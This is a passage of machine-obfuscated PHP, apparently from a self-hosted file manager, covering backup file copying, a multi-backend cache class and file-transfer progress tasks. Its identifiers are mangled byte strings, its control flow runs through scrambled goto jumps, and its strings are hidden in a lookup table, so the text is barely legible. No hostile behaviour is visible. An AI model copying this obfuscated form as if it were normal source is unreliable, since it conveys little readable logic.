dâ‘ÄİÊ‘’; bğ×Ô¸Ñ: $b¦ïñôí¸Ø->end(); $aèÒ²À‚Ïš = array($_SERVER[İë¬“ÅÒÛ›][520] => 1, $_SERVER[İë¬“ÅÒÛ›][461] => time(), $_SERVER[İë¬“ÅÒÛ›][467] => 1, $_SERVER[İë¬“ÅÒÛ›][517] => $aÊà®Ö½¬, $_SERVER[İë¬“ÅÒÛ›][509] => $Aù‹ßÜ‹ëÌ, $_SERVER[İë¬“ÅÒÛ›][508] => $f¨Ûöâë÷Ğ); if ($céĞáéø£à) { $aèÒ²À‚Ïš[$_SERVER[İë¬“ÅÒÛ›][518]] = $C©ë·ôñ·; $aèÒ²À‚Ïš[$_SERVER[İë¬“ÅÒÛ›][519]] = $Bƒø½ç¤¹; } goto D’±Š®ÍÔ³; D’±Š®ÍÔ³: Backup::set($aèÒ²À‚Ïš); $this->_fileFilter($aô“ê·‚˜); return !0; goto f·ÇßÔ¢ÓÚ; dâ‘ÄİÊ‘’: $e›½Ş…¬æ = Backup::get(); $aÊà®Ö½¬ = $e›½Ş…¬æ[$_SERVER[İë¬“ÅÒÛ›][285]][$_SERVER[İë¬“ÅÒÛ›][164]][$_SERVER[İë¬“ÅÒÛ›][383]]; $C „ÈÕ¥ = array($_SERVER[İë¬“ÅÒÛ›][391] => array($_SERVER[İë¬“ÅÒÛ›][504], $aÊà®Ö½¬), $_SERVER[İë¬“ÅÒÛ›][505] => array($_SERVER[İë¬“ÅÒÛ›][323], $e›½Ş…¬æ[$_SERVER[İë¬“ÅÒÛ›][449]])); goto cïšİ‘¢ªñ; cïšİ‘¢ªñ: $f¨Ûöâë÷Ğ = (int) Model($_SERVER[İë¬“ÅÒÛ›][480])->where($C „ÈÕ¥)->count($_SERVER[İë¬“ÅÒÛ›][383]); $Aù‹ßÜ‹ëÌ = (int) Model($_SERVER[İë¬“ÅÒÛ›][480])->where($C „ÈÕ¥)->sum($_SERVER[İë¬“ÅÒÛ›][78]); $b¦ïñôí¸Ø = new TaskFileTransfer($_SERVER[İë¬“ÅÒÛ›][506], $_SERVER[İë¬“ÅÒÛ›][469], $f¨Ûöâë÷Ğ, LNG($_SERVER[İë¬“ÅÒÛ›][470]) . $_SERVER[İë¬“ÅÒÛ›][471] . LNG($_SERVER[İë¬“ÅÒÛ›][507])); goto a­×½³èÊ; c‘°¸øìğ†: $aô“ê·‚˜ = array(); $Bƒø½ç¤¹ = $C©ë·ôñ· = 0; do { $d—°Ì±´« = $_SERVER[İë¬“ÅÒÛ›][510]; $e¡±Ê÷õ‰Â = Model($_SERVER[İë¬“ÅÒÛ›][480])->where($C „ÈÕ¥)->field($d—°Ì±´«)->order($_SERVER[İë¬“ÅÒÛ›][511])->selectPage($cÅ‹®Æä®, $FÕìÀÂé·ì); $D»é„ò™º = !empty($e¡±Ê÷õ‰Â[$_SERVER[İë¬“ÅÒÛ›][357]]) ? $e¡±Ê÷õ‰Â[$_SERVER[İë¬“ÅÒÛ›][357]] : array(); foreach ($D»é„ò™º as $fÍ©»Ş½Å) { goto F§¤ç¬İÏŠ; f‹çğòµ³ƒ: if ($d”½«ŒŠŞ >= 1024 * 1024 * 50) { $aèÒ²À‚Ïš = array($_SERVER[İë¬“ÅÒÛ›][517] => $aÊà®Ö½¬, $_SERVER[İë¬“ÅÒÛ›][518] => $C©ë·ôñ·, $_SERVER[İë¬“ÅÒÛ›][519] => $Bƒø½ç¤¹); Backup::set($aèÒ²À‚Ïš); $d”½«ŒŠŞ = $céĞáéø£à = 0; } goto D¬Ëö¾ˆéì; f·ÜŒ•Æ²: if (IO::exist($bñ©§ë¼ò)) { $b¦ïñôí¸Ø->updateFileEnd($fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][28]], $fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][78]]); } else { $bñ©§ë¼ò = get_path_father($bñ©§ë¼ò); $cŒ’—£Ü†ç = IO::mkdir($bñ©§ë¼ò); if (!$cŒ’—£Ü†ç || !IO::copy($dÇ×Ê—¶‹, $bñ©§ë¼ò, $_SERVER[İë¬“ÅÒÛ›][513])) { write_log($_SERVER[İë¬“ÅÒÛ›][514] . $dÇ×Ê—¶‹ . $_SERVER[İë¬“ÅÒÛ›][515] . $bñ©§ë¼ò . $_SERVER[İë¬“ÅÒÛ›][516], $_SERVER[İë¬“ÅÒÛ›][469]); continue; } } $aÊà®Ö½¬ = $fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][383]]; $céĞáéø£à += 1; goto CÉÖ«Çİêå; F§¤ç¬İÏŠ: if (!$this->_fileExist($fÍ©»Ş½Å, $aô“ê·‚˜)) { $f¨Ûöâë÷Ğ -= 1; $Aù‹ßÜ‹ëÌ -= (int) $fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][78]]; write_log("\x66\x69\x6c\x65\x20\x6e\157\x74\x20\145\170\x69\x73\x74\56\146\x69\x6c\145\111\x44\72{$fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][383]]}\54\40\160\141\x74\150\x3a{$fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][76]]}", $_SERVER[İë¬“ÅÒÛ›][512]); continue; } $dÇ×Ê—¶‹ = $fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][76]]; $bñ©§ë¼ò = "\x7b\x69\x6f\72{$e›½Ş…¬æ[$_SERVER[İë¬“ÅÒÛ›][449]]}\x7d" . substr($dÇ×Ê—¶‹, strlen("\173\151\157\x3a{$fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][481]]}\x7d")); goto f·ÜŒ•Æ²; CÉÖ«Çİêå: $d”½«ŒŠŞ += $fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][78]]; $C©ë·ôñ· += 1; $Bƒø½ç¤¹ += $fÍ©»Ş½Å[$_SERVER[İë¬“ÅÒÛ›][78]]; goto f‹çğòµ³ƒ; D¬Ëö¾ˆéì: } $BùÃÒ«ÆÚ¦ = count($D»é„ò™º); $FÕìÀÂé·ì++; } while ($BùÃÒ«ÆÚ¦ == $cÅ‹®Æä®); goto bğ×Ô¸Ñ; a­×½³èÊ: $b¦ïñôí¸Ø->task[$_SERVER[İë¬“ÅÒÛ›][456]] = $Aù‹ßÜ‹ëÌ; $aèÒ²À‚Ïš = array($_SERVER[İë¬“ÅÒÛ›][508] => $f¨Ûöâë÷Ğ, $_SERVER[İë¬“ÅÒÛ›][509] => $Aù‹ßÜ‹ëÌ); Backup::set($aèÒ²À‚Ïš); goto Aõ–Ë†ùÍ²; Aõ–Ë†ùÍ²: $FÕìÀÂé·ì = 1; $cÅ‹®Æä® = 1000; $d”½«ŒŠŞ = $céĞáéø£à = 0; goto c‘°¸øìğ†; f·ÇßÔ¢ÓÚ: } private function _fileExist($E–…ÊÍ‚”, &$f˜‘Ùé½÷İ) { goto dŸ»…ç¥³Ô; eÄ‘¹¯—áî: return !1; goto A ’Í›òß¨; bÅù”ËÍ‚È: if (IO::exist($BÉ•»´î)) { return !0; } $D˜ÔÔ öøª = get_path_father($BÉ•»´î); if (IO::exist($D˜ÔÔ öøª)) { $f˜‘Ùé½÷İ[] = $E–…ÊÍ‚”[$A®²âŠ½Ó†[383]]; return !1; } goto FáªÅ¡ë; dŸ»…ç¥³Ô: $A®²âŠ½Ó† =& $_SERVER[İë¬“ÅÒÛ›]; $BÉ•»´î = $E–…ÊÍ‚”[$A®²âŠ½Ó†[76]]; if (in_array($E–…ÊÍ‚”[$A®²âŠ½Ó†[383]], $f˜‘Ùé½÷İ)) { return !1; } goto bÅù”ËÍ‚È; FáªÅ¡ë: $Eõ…º¹Ûù = array($A®²âŠ½Ó†[481] => $E–…ÊÍ‚”[$A®²âŠ½Ó†[481]], $A®²âŠ½Ó†[76] => array($A®²âŠ½Ó†[521], "{$D˜ÔÔ öøª}\x25")); $EÆáøæˆ˜² = Model($A®²âŠ½Ó†[480])->where($Eõ…º¹Ûù)->field($A®²âŠ½Ó†[391])->select(); $f˜‘Ùé½÷İ = array_merge($f˜‘Ùé½÷İ, array_to_keyvalue($EÆáøæˆ˜², $A®²âŠ½Ó†[33], $A®²âŠ½Ó†[383])); goto eÄ‘¹¯—áî; A ’Í›òß¨: } private function _fileFilter($fˆÕ«µåÊ) { $FÑĞ„–Î¤¶ =& $_SERVER[İë¬“ÅÒÛ›]; if (empty($fˆÕ«µåÊ)) { return; } $d³šÃµª¶ = array($FÑĞ„–Î¤¶[383] => array($FÑĞ„–Î¤¶[7], array_unique($fˆÕ«µåÊ))); $f›ÇÒ¢œÛê = Model($FÑĞ„–Î¤¶[522])->where($d³šÃµª¶)->field($FÑĞ„–Î¤¶[375])->select(); foreach ($f›ÇÒ¢œÛê as $fõëŠ«¬¡Ä) { Model($FÑĞ„–Î¤¶[522])->remove($fõëŠ«¬¡Ä[$FÑĞ„–Î¤¶[375]], !1); } } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto D¬¨‚À¦ó¼; CÎÈ¡ùØ : switch ($fŒŠ¥·¾[$F¥¥çÃàñ[523]]) { case $F¥¥çÃàñ[17]: self::$handle = Model($F¥¥çÃàñ[525]); break; case $F¥¥çÃàñ[526]: self::$handle = new CacheRedis($E¤²í˜»Ùí, $B’¡Â–ËõÆ); break; case $F¥¥çÃàñ[527]: self::$handle = new CacheMemcached($E¤²í˜»Ùí, $B’¡Â–ËõÆ); break; case $F¥¥çÃàñ[164]: self::$handle = new CacheFile($E¤²í˜»Ùí, $B’¡Â–ËõÆ); break; default: break; } return self::$handle; goto Dõ—ÆÒ‹åÇ; D¬¨‚À¦ó¼: $F¥¥çÃàñ =& $_SERVER[İë¬“ÅÒÛ›]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto Eä‘äÂŞ; Eä‘äÂŞ: $fŒŠ¥·¾ = $GLOBALS[$F¥¥çÃàñ[6]][$F¥¥çÃàñ[341]]; $E¤²í˜»Ùí = $fŒŠ¥·¾[$fŒŠ¥·¾[$F¥¥çÃàñ[523]]]; $B’¡Â–ËõÆ = $fŒŠ¥·¾[$F¥¥çÃàñ[524]]; goto CÎÈ¡ùØ ; Dõ—ÆÒ‹åÇ: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($CäƒÏ¶ìƒÄ) { if (is_array($CäƒÏ¶ìƒÄ) || is_object($CäƒÏ¶ìƒÄ)) { $CäƒÏ¶ìƒÄ = json_encode($CäƒÏ¶ìƒÄ); } $CäƒÏ¶ìƒÄ = rawurlencode($CäƒÏ¶ìƒÄ); return KOD_SITE_ID . $_SERVER[İë¬“ÅÒÛ›][71] . $CäƒÏ¶ìƒÄ; } public static function get($f“­Ş…÷ŠË) { $f“­Ş…÷ŠË = self::key($f“­Ş…÷ŠË); if (!isset(self::$memoryCache[$f“­Ş…÷ŠË])) { CacheLock::lock($f“­Ş…÷ŠË); $fĞ†»‰Ú¡œ = self::init()->get($f“­Ş…÷ŠË); CacheLock::unlock($f“­Ş…÷ŠË); self::$memoryCache[$f“­Ş…÷ŠË] = unserialize($fĞ†»‰Ú¡œ); } return self::$memoryCache[$f“­Ş…÷ŠË]; } public static function set($AˆœÃî…¶, $e…Â’ä¨Ü, $e§®ÇÉœŞ¶ = false) { goto Bñµ†ˆŞ…; Bñµ†ˆŞ…: $AˆœÃî…¶ = self::key($AˆœÃî…¶); if (isset(self::$memoryCache[$AˆœÃî…¶]) && self::$memoryCache[$AˆœÃî…¶] === $e…Â’ä¨Ü) { return !0; } if ($e§®ÇÉœŞ¶ === 0) { self::$memoryCache[$AˆœÃî…¶] = $e…Â’ä¨Ü; return !0; } goto BÙùìœè¿®; cÛÁ…ô¥Şš: CacheLock::unlock($AˆœÃî…¶); return $BæÓÔ´ÓØ; goto aöİËªãù; BÙùìœè¿®: CacheLock::lock($AˆœÃî…¶); $BæÓÔ´ÓØ = self::init()->set($AˆœÃî…¶, serialize($e…Â’ä¨Ü), $e§®ÇÉœŞ¶); self::$memoryCache[$AˆœÃî…¶] = $e…Â’ä¨Ü; goto cÛÁ…ô¥Şš; aöİËªãù: } public static function remove($a Äà¾ÆÁÕ) { goto FÂ›‹«‰îœ; FÂ›‹«‰îœ: $a Äà¾ÆÁÕ = self::key($a Äà¾ÆÁÕ); unset(self::$memoryCache[$a Äà¾ÆÁÕ]); self::clearTimeout(); goto BÕôì¹šğé; BÕôì¹šğé: CacheLock::lock($a Äà¾ÆÁÕ); $C¡™ê¬½†½ = self::init()->remove($a Äà¾ÆÁÕ); CacheLock::unlock($a Äà¾ÆÁÕ); goto FÁè­ÀÒ‘ê; FÁè­ÀÒ‘ê: return $C¡™ê¬½†½; goto C›Ä¾á÷×; C›Ä¾á÷×: } public static function clearMemory($dÁˆ‡¨ªÚ = false) { if ($dÁˆ‡¨ªÚ) { $dÁˆ‡¨ªÚ = self::key($dÁˆ‡¨ªÚ); unset(self::$memoryCache[$dÁˆ‡¨ªÚ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[İë¬“ÅÒÛ›][528])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[İë¬“ÅÒÛ›][529])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($f÷Ò‹ùéŠš, $c‘ºÎù–É¾) { $b“„ÒŸÔÈë =& $_SERVER[İë¬“ÅÒÛ›]; $this->cachePath = $f÷Ò‹ùéŠš[$b“„ÒŸÔÈë[76]]; $this->prefix = $b“„ÒŸÔÈë[530]; $this->cacheTime = $c‘ºÎù–É¾; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($aÖèğéœ½) { $C¾İ‡í¾‰– =& $_SERVER[İë¬“ÅÒÛ›]; $aÖèğéœ½ = str_replace(array($C¾İ‡í¾‰–[496], $C¾İ‡í¾‰–[94], $C¾İ‡í¾‰–[70]), $C¾İ‡í¾‰–[531], $aÖèğéœ½); return $this->cachePath . $C¾İ‡í¾‰–[532] . $aÖèğéœ½ . $C¾İ‡í¾‰–[533]; } public function set($F„µ—õ¸ñÖ, $E»–†ñ¹â¨, $Eê¹äŒÜì = false) { $cÈÂÅ‚Â³ê = $this->getFile($F„µ—õ¸ñÖ); if (file_put_contents($cÈÂÅ‚Â³ê, $this->prefix . $E»–†ñ¹â¨, LOCK_EX)) { return !0; } @unlink($cÈÂÅ‚Â³ê); return !1; } public function get($F»åóœôÀŒ) { $E­æ•©¤ÖÍ = $this->getFile($F»åóœôÀŒ); if (file_exists($E­æ•©¤ÖÍ) && filemtime($E­æ•©¤ÖÍ) < time() - $this->cacheTime) { @unlink($E­æ•©¤ÖÍ); return !1; } $f¢’ëÒÇ = @file_get_contents($E­æ•©¤ÖÍ); return substr($f¢’ëÒÇ, strlen($this->prefix)); } public function remove($eÎÏÆ¢’ùÃ) { $d¾™œ±†Ç = $this->getFile($eÎÏÆ¢’ùÃ); return @unlink($d¾™œ±†Ç); } public function deleteAll() { $dõ‡®¸†¬ =& $_SERVER[İë¬“ÅÒÛ›]; $bË©»Æ™  = scandir($this->cachePath); foreach ($bË©»Æ™  as $CÄ˜…­è¨Œ) { $BŞšÅ¿İÓö = $this->cachePath . $CÄ˜…­è¨Œ; if (strpos($BŞšÅ¿İÓö, $dõ‡®¸†¬[533]) && strpos($BŞšÅ¿İÓö, $dõ‡®¸†¬[534])) { @unlink($BŞšÅ¿İÓö); } } } public function clearTimeout() { $FÉÜà¦Øáİ =& $_SERVER[İë¬“ÅÒÛ›]; $aùî¶î·­È = scandir($this->cachePath); foreach ($aùî¶î·­È as $C„¹¤Ü×ˆ) { $dÌ´ƒË­°Ñ = $this->cachePath . $C„¹¤Ü×ˆ; if (strpos($dÌ´ƒË­°Ñ, $FÉÜà¦Øáİ[533]) && strpos($dÌ´ƒË­°Ñ, $FÉÜà¦Øáİ[534]) && filemtime($dÌ´ƒË­°Ñ) < time() - $this->cacheTime) { @unlink($dÌ´ƒË­°Ñ); } } } } goto aÍóœÊ«ê„; d†‘¶²—µ: class TaskFileTransfer extends Task { protected function startAfter() { goto Aß·…Ø³–; FÓÍíÈ¨í: $Cæ§ó‡äÜ¼[$Eš²¾³[1133]] = LNG($Eš²¾³[1134]); $Cæ§ó‡äÜ¼[$Eš²¾³[1135]] = 0; $Cæ§ó‡äÜ¼[$Eš²¾³[1136]] = 0; goto aÔœ‚¿ƒ¢; F¬¾ÊË : if (!$Cæ§ó‡äÜ¼[$Eš²¾³[1004]]) { $Cæ§ó‡äÜ¼[$Eš²¾³[1004]] = LNG($Eš²¾³[1139]); } goto d„‰ÜÔ·ÃÛ; BÄßß†Ò¤Ø: Hook::bind($Eš²¾³[424], array($this, $Eš²¾³[1125])); Hook::bind($Eš²¾³[426], array($this, $Eš²¾³[1126])); Hook::bind($Eš²¾³[427], array($this, $Eš²¾³[1126])); goto fî’…‡Ü…; Aß·…Ø³–: $Eš²¾³ =& $_SERVER[İë¬“ÅÒÛ›]; $Cæ§ó‡äÜ¼ =& $this->task; $this->sourceCopyFolder = !1; goto BÓ¶î‘¢¶; fî’…‡Ü…: Hook::bind($Eš²¾³[1127], array($this, $Eš²¾³[1128])); Hook::bind($Eš²¾³[1129], array($this, $Eš²¾³[1130])); Hook::bind($Eš²¾³[1131], array($this, $Eš²¾³[1132])); goto FÓÍíÈ¨í; BÓ¶î‘¢¶: Hook::bind($Eš²¾³[1120], array($this, $Eš²¾³[1121])); Hook::bind($Eš²¾³[1122], array($this, $Eš²¾³[1123])); Hook::bind($Eš²¾³[423], array($this, $Eš²¾³[1124])); goto BÄßß†Ò¤Ø; aÔœ‚¿ƒ¢: $Cæ§ó‡äÜ¼[$Eš²¾³[1096]] = $Eš²¾³[33]; $Cæ§ó‡äÜ¼[$Eš²¾³[1137]] = $Eš²¾³[33]; $Cæ§ó‡äÜ¼[$Eš²¾³[1138]] = 0; goto F¬¾ÊË ; d„‰ÜÔ·ÃÛ: } protected function endAfter() { $Dğ¶Üøí˜• =& $_SERVER[İë¬“ÅÒÛ›]; Hook::unbind($Dğ¶Üøí˜•[1120], array($this, $Dğ¶Üøí˜•[1121])); Hook::unbind($Dğ¶Üøí˜•[1122], array($this, $Dğ¶Üøí˜•[1123])); Hook::unbind($Dğ¶Üøí˜•[1127], array($this, $Dğ¶Üøí˜•[1128])); Hook::unbind($Dğ¶Üøí˜•[1129], array($this, $Dğ¶Üøí˜•[1130])); Hook::unbind($Dğ¶Üøí˜•[1131], array($this, $Dğ¶Üøí˜•[1132])); } public function updateAfter() { goto aÏ²âÂ–¥Ø; c™ˆºÍ×·ñ: $aßÊŠ¸ŒÚ = 0; if ($e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1137]] == $A×»©ËÃßÀ[792]) { $aßÊŠ¸ŒÚ = $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1136]] * 0.5; } else { if ($e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1137]] == $A×»©ËÃßÀ[90]) { $aßÊŠ¸ŒÚ = $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1136]] * 0.5 + $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1135]] * 0.5; } } $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1099]] = ($e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1140]] + $aßÊŠ¸ŒÚ) / $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[456]]; goto fç©Ì§Üöœ; aÏ²âÂ–¥Ø: $A×»©ËÃßÀ =& $_SERVER[İë¬“ÅÒÛ›]; $e¤¡Ãï•Ó± =& $this->task; if (!$e¤¡Ãï•Ó±[$A×»©ËÃßÀ[456]]) { return; } goto c™ˆºÍ×·ñ; fç©Ì§Üöœ: if ($e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1099]] > 0) { $c—º£‚‚„è = timeFloat() - $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1101]] - $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1104]]; $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1105]] = $c—º£‚‚„è * (1 - $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1099]]) / $e¤¡Ãï•Ó±[$A×»©ËÃßÀ[1099]]; } goto dö†ˆŒ¶¶ƒ; dö†ˆŒ¶¶ƒ: } public function addPath($E¡èÔ—§¾) { goto b÷·ë×Úº; b÷·ë×Úº: $açÇâµ¿ª¹ =& $_SERVER[İë¬“ÅÒÛ›]; $Dİ‚Ù‰Ç†ˆ =& $this->task; $cé°ë×Öã– = IO::infoWithChildren($E¡èÔ—§¾); goto bŠöêºÛĞª; c©ğµ¿çÀ²: $Dİ‚Ù‰Ç†ˆ[$açÇâµ¿ª¹[456]] += $cé°ë×Öã–[$açÇâµ¿ª¹[78]]; $this->update(); goto bµ›¾¹Öİ‰; bŠöêºÛĞª: if (!$Dİ‚Ù‰Ç†ˆ[$açÇâµ¿ª¹[1141]]) { $Dİ‚Ù‰Ç†ˆ[$açÇâµ¿ª¹[1141]] = array(); } $Dİ‚Ù‰Ç†ˆ[$açÇâµ¿ª¹[1141]][] = array($açÇâµ¿ª¹[388] => $cé°ë×Öã–[$açÇâµ¿ª¹[28]], $açÇâµ¿ª¹[76] => $cé°ë×Öã–[$açÇâµ¿ª¹[76]], $açÇâµ¿ª¹[777] => $cé°ë×Öã–[$açÇâµ¿ª¹[777]] ? $cé°ë×Öã–[$açÇâµ¿ª¹[777]] : $cé°ë×Öã–[$açÇâµ¿ª¹[76]]); if ($cé°ë×Öã–[$açÇâµ¿ª¹[29]] == $açÇâµ¿ª¹[164]) { $Dİ‚Ù‰Ç†ˆ[$açÇâµ¿ª¹[1097]] += 1; } else { $Dİ‚Ù‰Ç†ˆ[$açÇâµ¿ª¹[1097]] += $cé°ë×Öã–[$açÇâµ¿ª¹[81]][$açÇâµ¿ª¹[79]]; } goto c©ğµ¿çÀ²; bµ›¾¹Öİ‰: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($CÉÄ¤›¯·°) { $cœàšáŠğˆ =& $_SERVER[İë¬“ÅÒÛ›]; $Dï˜†Ô˜«Ë =& $this->task; $Dï˜†Ô˜«Ë[$cœàšáŠğˆ[1133]] = $CÉÄ¤›¯·°[$cœàšáŠğˆ[28]]; $Dï˜†Ô˜«Ë[$cœàšáŠğˆ[1096]] = $CÉÄ¤›¯·°[$cœàšáŠğˆ[28]]; $this->update(); } public function copyFileStart($D§îÍÅÃŞ™, $C…Ä”œ«Ëù, $BæŒ÷äŠË, $eóª’ïê¤Æ, $c·æµè†çÌ, $bÊ¬…Š»­) { goto BÌ¥÷µ©¼°; bŞëÏÉˆ¶¬: $fÕŞ½ÂÇ¦Í[$EäÒ™Ñ†™[1133]] = $AÎä»¨›ò¯; $fÕŞ½ÂÇ¦Í[$EäÒ™Ñ†™[1135]] = (int) $D§îÍÅÃŞ™->size($C…Ä”œ«Ëù); $fÕŞ½ÂÇ¦Í[$EäÒ™Ñ†™[1136]] = 0; goto dêÉ×œ“ê; cŠŠÙªÀô: $GLOBALS[$EäÒ™Ñ†™[1143]] = $c·æµè†çÌ; $GLOBALS[$EäÒ™Ñ†™[1142]] = $bÊ¬…Š»­; $fÕŞ½ÂÇ¦Í =& $this->task; goto bŞëÏÉˆ¶¬; BÌ¥÷µ©¼°: $EäÒ™Ñ†™ =& $_SERVER[İë¬“ÅÒÛ›]; $AÎä»¨›ò¯ = $c·æµè†çÌ; if ($AÎä»¨›ò¯ == $GLOBALS[$EäÒ™Ñ†™[1142]]) { $AÎä»¨›ò¯ = $GLOBALS[$EäÒ™Ñ†™[1143]]; } goto cŠŠÙªÀô; C±ïÚĞ·Š”: $this->update(); goto F¦÷‰óó½; dêÉ×œ“ê: $fÕŞ½ÂÇ¦Í[$EäÒ™Ñ†™[1096]] = $EäÒ™Ñ†™[33]; $fÕŞ½ÂÇ¦Í[$EäÒ™Ñ†™[1137]] = $EäÒ™Ñ†™[33]; $fÕŞ½ÂÇ¦Í[$EäÒ™Ñ†™[1138]] = 0; goto C±ïÚĞ·Š”; F¦÷‰óó½: } public function copyFileEnd($bµØÅ›—éÈ, $AïïÁè±“ö, $F”‘Ëõ·ì¨, $c±™õ–ù‚, $F“‡ğ¿ÜÍ, $fˆ¼É±—ø) { $f·¨·¾è¥ =& $_SERVER[İë¬“ÅÒÛ›]; $E³†ÚóÙÜæ =& $this->task; $E³†ÚóÙÜæ[$f·¨·¾è¥[1136]] = $E³†ÚóÙÜæ[$f·¨·¾è¥[1135]]; $E³†ÚóÙÜæ[$f·¨·¾è¥[1140]] += $E³†ÚóÙÜæ[$f·¨·¾è¥[1135]]; $E³†ÚóÙÜæ[$f·¨·¾è¥[1137]] = $f·¨·¾è¥[33]; $this->update(1); } public function updateFileEnd($f÷ö”ïë‘‰, $Cƒå»¢³‘) { $dé„¨¼¿À‡ =& $_SERVER[İë¬“ÅÒÛ›]; $Eò¤ã¥ñîÌ =& $this->task; $Eò¤ã¥ñîÌ[$dé„¨¼¿À‡[1133]] = $f÷ö”ïë‘‰; $Eò¤ã¥ñîÌ[$dé„¨¼¿À‡[1135]] = $Cƒå»¢³‘; $Eò¤ã¥ñîÌ[$dé„¨¼¿À‡[1140]] += $Cƒå»¢³‘; $this->update(1); } public function curlProgress($Aª¢Šøó‚ç, $Fà‰•¦«á…, $Eƒè½¡à, $eƒ­ÄÅç¥, $B‘ºÑ½æÕ—) { $DÇ¶´Ò¯‹Ù =& $_SERVER[İë¬“ÅÒÛ›]; $AŸø¸¿›¯ˆ =& $this->task; if ($B‘ºÑ½æÕ— > 0) { $AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1096]] = $DÇ¶´Ò¯‹Ù[1144]; $AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1137]] = $DÇ¶´Ò¯‹Ù[90]; if ($AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1135]] == $eƒ­ÄÅç¥ || $eƒ­ÄÅç¥ > 1024 * 1024) { $AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1136]] = $B‘ºÑ½æÕ—; } if ($AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1138]]) { $AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1136]] = $B‘ºÑ½æÕ— + $AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1138]]; } } else { if ($Eƒè½¡à > 0) { if ($AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1135]] == $Fà‰•¦«á…) { $AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1136]] = $Eƒè½¡à; $AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1096]] = $DÇ¶´Ò¯‹Ù[1145]; $AŸø¸¿›¯ˆ[$DÇ¶´Ò¯‹Ù[1137]] = $DÇ¶´Ò¯‹Ù[792]; } } } $this->update(); } public function curlProgressStart($aÕ¡·ˆ¬Šé) { } public function curlProgressEnd($F‚±°òÈô´) { $cµ¸¬ÓæğØ =& $_SERVER[İë¬“ÅÒÛ›]; $D“í’åã§ =& $this->task; $dê’Ä¶ÑÜ£ = curl_getinfo($F‚±°òÈô´); $cÁá»¤© Ü = $dê’Ä¶ÑÜ£[$cµ¸¬ÓæğØ[1146]]; if ($D“í’åã§[$cµ¸¬ÓæğØ[1137]] == $cµ¸¬ÓæğØ[90] && $cÁá»¤© Ü) { $D“í’åã§[$cµ¸¬ÓæğØ[1138]] += $cÁá»¤© Ü; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $DŞËáìéß± =& $_SERVER[İë¬“ÅÒÛ›]; $DùÛğöÒâÊ =& $this->task; Hook::bind($DŞËáìéß±[1129], array($this, $DŞËáìéß±[1147])); Hook::bind($DŞËáìéß±[1127], array($this, $DŞËáìéß±[1148])); Hook::bind($DŞËáìéß±[1131], array($this, $DŞËáìéß±[1149])); } protected function endAfter() { $f©àµ¢ÄÕ¨ =& $_SERVER[İë¬“ÅÒÛ›]; Hook::unbind($f©àµ¢ÄÕ¨[1129], array($this, $f©àµ¢ÄÕ¨[1147])); } public function progressStart($CÚ§¡ÖœÀ‘) { $eÌ¤óÇ¬¹ =& $_SERVER[İë¬“ÅÒÛ›]; $e¢¸çâç– = curl_getinfo($CÚ§¡ÖœÀ‘); self::log($eÌ¤óÇ¬¹[1150] . $e¢¸çâç–[$eÌ¤óÇ¬¹[299]]); self::valueSet($this->task[$eÌ¤óÇ¬¹[369]], $this->task); } public function progressEnd($E†í§àèô¤) { $dÔ®¤Ø“í¬ =& $_SERVER[İë¬“ÅÒÛ›]; self::log($dÔ®¤Ø“í¬[1151] . $this->task[$dÔ®¤Ø“í¬[369]]); $this->end(); } public function progress($F«²ä¼ˆÛë, $AÊƒ·ŠŒ—è, $B³£ô­Áùå, $C¡ÅÈ™àë, $D’ˆò÷Šê‹) { $EŸ’äô¡œ¸ =& $_SERVER[İë¬“ÅÒÛ›]; $cÉêµğˆØç =& $this->task; if ($D’ˆò÷Šê‹ > 0) { $cÉêµğˆØç[$EŸ’äô¡œ¸[1097]] = $cÉêµğˆØç[$EŸ’äô¡œ¸[1097]] == 0 ? $C¡ÅÈ™àë : $cÉêµğˆØç[$EŸ’äô¡œ¸[1097]]; $cÉêµğˆØç[$EŸ’äô¡œ¸[1098]] = $D’ˆò÷Šê‹; } else { if ($B³£ô­Áùå > 0) { $cÉêµğˆØç[$EŸ’äô¡œ¸[1097]] = 